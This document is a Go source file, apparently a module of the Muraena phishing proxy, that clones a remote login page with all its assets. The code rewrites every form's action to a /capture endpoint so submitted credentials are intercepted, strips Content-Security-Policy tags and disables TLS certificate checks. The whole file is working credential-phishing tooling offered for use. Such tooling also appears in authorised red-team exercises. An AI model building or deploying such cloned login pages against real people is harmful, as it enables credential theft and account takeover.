package logincloner

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"

	"github.com/muraenateam/muraena/session"
)

const (
	Name        = "logincloner"
	Description = "Fetches a remote login page and clones it locally with all assets intact"
	Author      = "Muraena Team"
)

// LoginCloner module
type LoginCloner struct {
	session.SessionModule

	Enabled   bool
	TargetURL string
	OutputDir string
	client    *http.Client
}

func (module *LoginCloner) Name() string        { return Name }
func (module *LoginCloner) Description() string { return Description }
func (module *LoginCloner) Author() string      { return Author }
func (module *LoginCloner) Prompt()             { module.Raw("No interactive options for this module") }

// Load initialises the module from session config and runs the clone if enabled.
func Load(s *session.Session) (m *LoginCloner, err error) {
	m = &LoginCloner{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.LoginCloner.Enabled,
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	m.TargetURL = s.Config.LoginCloner.TargetURL
	m.OutputDir = s.Config.LoginCloner.OutputDir
	m.client = newHTTPClient()

	if err = m.Clone(m.TargetURL, m.OutputDir); err != nil {
		m.Warning("clone failed: %s", err)
		return
	}

	m.Info("login page cloned to %s", m.OutputDir)
	return
}

// Clone fetches the login page at targetURL and writes a self-contained local
// copy under outputDir. All CSS, JS and image assets are downloaded into an
// assets/ sub-directory and HTML references are rewritten accordingly.
// Every <form> action is repointed to /capture so credentials submitted through
// the cloned page are intercepted by the proxy.
func (module *LoginCloner) Clone(targetURL, outputDir string) error {
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return err
	}

	base, err := url.Parse(targetURL)
	if err != nil {
		return fmt.Errorf("invalid target URL: %w", err)
	}

	resp, err := module.client.Get(targetURL)
	if err != nil {
		return fmt.Errorf("fetching %s: %w", targetURL, err)
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return fmt.Errorf("parsing HTML: %w", err)
	}

	assetsDir := filepath.Join(outputDir, "assets")
	if err := os.MkdirAll(assetsDir, 0755); err != nil {
		return err
	}

	seen := make(map[string]string) // raw URL → local relative path

	save := func(rawURL string) string {
		if cached, ok := seen[rawURL]; ok {
			return cached
		}
		local := module.fetchAsset(base, rawURL, assetsDir)
		seen[rawURL] = local
		return local
	}

	localRef := func(local string) string {
		if local == "" {
			return ""
		}
		return "assets/" + filepath.Base(local)
	}

	// Stylesheets
	doc.Find("link[rel='stylesheet'], link[type='text/css']").Each(func(_ int, s *goquery.Selection) {
		if href, ok := s.Attr("href"); ok {
			if ref := localRef(save(href)); ref != "" {
				s.SetAttr("href", ref)
			}
		}
	})

	// Scripts
	doc.Find("script[src]").Each(func(_ int, s *goquery.Selection) {
		if src, ok := s.Attr("src"); ok {
			if ref := localRef(save(src)); ref != "" {
				s.SetAttr("src", ref)
			}
		}
	})

	// Images
	doc.Find("img[src]").Each(func(_ int, s *goquery.Selection) {
		if src, ok := s.Attr("src"); ok {
			if ref := localRef(save(src)); ref != "" {
				s.SetAttr("src", ref)
			}
		}
	})

	// Favicons and other link resources
	doc.Find("link[rel='icon'], link[rel='shortcut icon'], link[rel='apple-touch-icon']").Each(func(_ int, s *goquery.Selection) {
		if href, ok := s.Attr("href"); ok {
			if ref := localRef(save(href)); ref != "" {
				s.SetAttr("href", ref)
			}
		}
	})

	// Repoint form actions so the proxy can intercept credentials.
	doc.Find("form").Each(func(_ int, s *goquery.Selection) {
		s.SetAttr("action", "/capture")
		s.SetAttr("method", "POST")
	})

	// Remove elements that would phone home or break the clone.
	doc.Find("meta[http-equiv='Content-Security-Policy']").Remove()

	html, err := doc.Html()
	if err != nil {
		return fmt.Errorf("serialising HTML: %w", err)
	}

	outPath := filepath.Join(outputDir, "index.html")
	return os.WriteFile(outPath, []byte(html), 0644)
}

var cssURLRe = regexp.MustCompile(`url\(['"]?([^'")\s]+)['"]?\)`)

// fetchAsset resolves rawURL against base, downloads it, and saves it under
// assetsDir. For CSS files it also rewrites embedded url() references.
// Returns the local file path on success, empty string on failure.
func (module *LoginCloner) fetchAsset(base *url.URL, rawURL, assetsDir string) string {
	rawURL = strings.TrimSpace(rawURL)
	if rawURL == "" || strings.HasPrefix(rawURL, "data:") {
		return ""
	}

	ref, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	assetURL := base.ResolveReference(ref).String()

	resp, err := module.client.Get(assetURL)
	if err != nil {
		module.Warning("could not fetch asset %s: %s", assetURL, err)
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}

	ct := resp.Header.Get("Content-Type")
	if strings.Contains(ct, "text/css") || strings.HasSuffix(strings.ToLower(ref.Path), ".css") {
		body = module.rewriteCSSURLs(base, body, assetsDir)
	}

	filename := sanitiseFilename(ref.Path)
	localPath := filepath.Join(assetsDir, filename)

	// Avoid clobbering when two different paths share the same base name.
	if _, err := os.Stat(localPath); err == nil {
		localPath = deduplicate(localPath)
	}

	if err := os.WriteFile(localPath, body, 0644); err != nil {
		module.Warning("could not save asset %s: %s", localPath, err)
		return ""
	}

	return localPath
}

// rewriteCSSURLs replaces url() references inside a CSS file with locally
// fetched copies so the cloned page has no external dependencies.
func (module *LoginCloner) rewriteCSSURLs(base *url.URL, css []byte, assetsDir string) []byte {
	return cssURLRe.ReplaceAllFunc(css, func(match []byte) []byte {
		sub := cssURLRe.FindSubmatch(match)
		if len(sub) < 2 {
			return match
		}
		raw := string(sub[1])
		local := module.fetchAsset(base, raw, assetsDir)
		if local == "" {
			return match
		}
		return []byte(fmt.Sprintf("url('%s')", filepath.Base(local)))
	})
}

func sanitiseFilename(urlPath string) string {
	base := filepath.Base(urlPath)
	if idx := strings.IndexAny(base, "?#"); idx != -1 {
		base = base[:idx]
	}
	base = strings.NewReplacer(":", "_", " ", "_").Replace(base)
	if base == "" || base == "." || base == "/" {
		return "asset"
	}
	return base
}

func deduplicate(path string) string {
	ext := filepath.Ext(path)
	stem := strings.TrimSuffix(path, ext)
	for i := 1; ; i++ {
		candidate := fmt.Sprintf("%s_%d%s", stem, i, ext)
		if _, err := os.Stat(candidate); os.IsNotExist(err) {
			return candidate
		}
	}
}

// CloneWithClient is the same as Clone but uses the provided HTTP client — useful
// in tests where you want to point at a test server.
func (module *LoginCloner) CloneWithClient(client *http.Client, targetURL, outputDir string) error {
	orig := module.client
	module.client = client
	err := module.Clone(targetURL, outputDir)
	module.client = orig
	return err
}

// HtmlFromDir returns the HTML bytes of the cloned index.html inside outputDir.
func (module *LoginCloner) HtmlFromDir(outputDir string) ([]byte, error) {
	return os.ReadFile(filepath.Join(outputDir, "index.html"))
}

func newHTTPClient() *http.Client {
	return &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}
}
